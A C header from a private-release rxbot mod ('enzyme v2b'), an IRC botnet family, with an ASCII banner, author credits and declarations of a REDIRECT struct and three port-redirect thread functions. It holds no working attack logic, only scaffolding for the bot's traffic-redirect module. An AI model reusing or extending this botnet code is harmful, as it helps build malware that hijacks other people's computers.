/*
 XXXXX   XXXXXX   XXXXXXX   XXX XXX XXXXXXX   XXXXX
XXX XXX  XXX XXX  XX  XXX   XXX XXX XXXXXXXX XXX XXX
XXXXXXX  XXX XXX     XXX    XXX XXX XXXXXXXX XXXXXXX
XXX      XXX XXX   XXX      XXX XXX XXXXXXXX XXX
XXX XXX  XXX XXX  XXX  XX    XXXXX  XXXXXXXX XXX XXX
 XXXXX   XXX XXX  XXXXXXX      XXX  XXX  XXX  XXXXX
                              XXX               .v2b
                           XXXXX
 ____________________
+ enzyme ..v2b       +
| nzm rxbot mod ..   |
| private release *  |
| 04.04.05	         |
+____________________+
		      ____________________
 		     + code from ..       +
		     | bcuzz              |
		     | stoney  		      |
		     | x-lock	          |
		     | ionix              |
		     | phatty		      |
		     | nesespray	      |
		     | rbot dev team 	  |
		     +____________________+
 ____________________
+ read ..            +
| the docs           |
| don't ..           |
| mass distribute    |
+____________________+

*/

#ifndef NO_REDIRECT
// redirect structure.
typedef struct REDIRECT
{
	SOCKET sock;
	SOCKET csock;
	char dest[128];
	char chan[128];
	int port;
	int lport;
	int threadnum;
	int cthreadnum;
	BOOL notice;
	BOOL silent;
	BOOL gotinfo;
	BOOL cgotinfo;

} REDIRECT;

DWORD WINAPI RedirectThread(LPVOID param);
DWORD WINAPI RedirectLoopThread(LPVOID param);
DWORD WINAPI RedirectLoop2Thread(LPVOID param);
#endif
